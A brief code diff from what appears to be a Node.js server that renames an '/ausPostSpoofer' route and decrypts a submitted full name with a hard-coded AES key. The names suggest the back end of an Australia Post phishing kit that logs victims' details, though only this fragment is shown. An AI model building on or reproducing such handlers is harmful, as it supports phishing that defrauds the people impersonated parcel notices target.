@@ -256,9 +256,9 @@ app.post("/ausPostLog", (req, res) => {
 //AUSPOST
 //AUSPOST
 
-app.options("/ausPostSpoofer", cors());
+app.options("/ausPostManny", cors());
 
-app.post("/ausPostSpoofer", (req, res) => {
+app.post("/ausPostManny", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
     CryptoJS.enc.Utf8
   );
